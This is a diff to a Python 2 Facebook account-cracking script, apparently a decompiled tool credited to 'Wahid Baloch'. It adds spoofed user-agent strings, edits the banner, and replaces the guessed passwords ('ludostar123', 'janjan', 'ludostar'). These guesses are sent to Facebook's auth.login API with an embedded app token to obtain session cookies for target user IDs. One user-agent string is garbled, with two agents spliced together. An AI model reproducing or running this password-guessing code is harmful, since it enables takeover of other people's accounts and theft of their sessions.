@@ -4,6 +4,7 @@
 
 #decompile by star-vampire
 
+
 try:
 
     import os,sys,time,datetime,re,random,hashlib,threading,json,getpass,urllib,cookielib,requests
@@ -16,7 +17,15 @@ except ImportError:
 
     os.system("python2 cracker.indirect")
 
-    
+#### USER-AGENT ####
+ua = "Mozilla/5.0 (Linux; Android 10; TECNO KE5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36"
+ua1 = "Mozilla/5.0 (Linux; Android 10; TECNO SPARK) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36"
+ua2 = "MoziMozilla/5.0 (Linux; Android 10; TECNO KE5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36lla/5.0 (iPhone; CPU iPhone OS 10_3_2 like Mac OS X) AppleWebKit/603.2.4 (KHTML, like Gecko) FxiOS/7.5b3349 Mobile/14F89 Safari/603.2.4"
+ua3 = "Mozilla/5.0 (Linux; Android 10; TECNO KE5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36"
+ua4 = "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
+ua5 = "Mozilla/5.0 (Linux; Android 10; SAMSONG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36"
+
+
 
 os.system("clear")
 
@@ -72,20 +81,20 @@ logo = """
 
                   
 
-╭╮╭╮╭┳━━━┳╮╱╭┳━━┳━━━╮╭━━╮╭━━━┳━━━┳╮╱╭┳━━╮
-┃┃┃┃┃┃╭━╮┃┃╱┃┣┫┣┻╮╭╮┃┃╭╮┃┃╭━╮┃╭━╮┃┃╱┃┣┫┣╯
-┃┃┃┃┃┃┃╱┃┃╰━╯┃┃┃╱┃┃┃┃┃╰╯╰┫╰━╯┃┃╱┃┃╰━╯┃┃┃
-┃╰╯╰╯┃╰━╯┃╭━╮┃┃┃╱┃┃┃┃┃╭━╮┃╭╮╭┫┃╱┃┃╭━╮┃┃┃
-╰╮╭╮╭┫╭━╮┃┃╱┃┣┫┣┳╯╰╯┃┃╰━╯┃┃┃╰┫╰━╯┃┃╱┃┣┫┣╮
-╱╰╯╰╯╰╯╱╰┻╯╱╰┻━━┻━━━╯╰━━━┻╯╰━┻━━━┻╯╱╰┻━━╯
+╭╮╭╮╭┳━━━┳╮╱╭┳━━┳━━━╮  ╭━━╮╭━━━┳━━━┳╮╱╭┳━━╮
+┃┃┃┃┃┃╭━╮┃┃╱┃┣┫┣┻╮╭╮┃  ┃╭╮┃┃╭━╮┃╭━╮┃┃╱┃┣┫┣╯
+┃┃┃┃┃┃┃╱┃┃╰━╯┃┃┃╱┃┃┃┃  ┃╰╯╰┫╰━╯┃┃╱┃┃╰━╯┃┃┃
+┃╰╯╰╯┃╰━╯┃╭━╮┃┃┃╱┃┃┃┃  ┃╭━╮┃╭╮╭┫┃╱┃┃╭━╮┃┃┃
+╰╮╭╮╭┫╭━╮┃┃╱┃┣┫┣┳╯╰╯┃  ┃╰━╯┃┃┃╰┫╰━╯┃┃╱┃┣┫┣╮
+╱╰╯╰╯╰╯╱╰┻╯╱╰┻━━┻━━━╯  ╰━━━┻╯╰━┻━━━┻╯╱╰┻━━╯
 
           
 
-                🖕 Father Of All Hacker🖕                        
+                🖕 Father Of All Hackers🖕                        
 
 \033[1;96m◁━━━━━━━━━━━━━━━━━━━━◈✙◈━━━━━━━━━━━━━━━━━━━━▷\033[1;97m
 
-\033[1;96m(~)\033[1;97m Author : Wahid Baloch \033[1;97m[ \033[0;92mKHAN BROHI \033[1;97m]
+\033[1;96m(~)\033[1;97m Author : Wahid Baloch \033[1;97m[ \033[0;92mIHSANO KANJAR \033[1;97m]
 
 \033[1;96m(~)\033[1;97m Github : https://github.com/Wahidbaloch88
 
@@ -593,7 +602,7 @@ def menu_select():
 
 		        else:
 
-		            pass2=name+"khan"
+		            pass2="ludostar123"
 
 		            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 
@@ -661,7 +670,7 @@ def menu_select():
 
 		                        else:
 
-		                            pass4=name+"ali"
+		                            pass4="janjan"
 
 		                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass4 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 
@@ -729,7 +738,7 @@ def menu_select():
 
 		                                        else:
 
-		                                            pass6="khan1122"
+		                                            pass6="ludostar"
 
 		                                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass6 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 
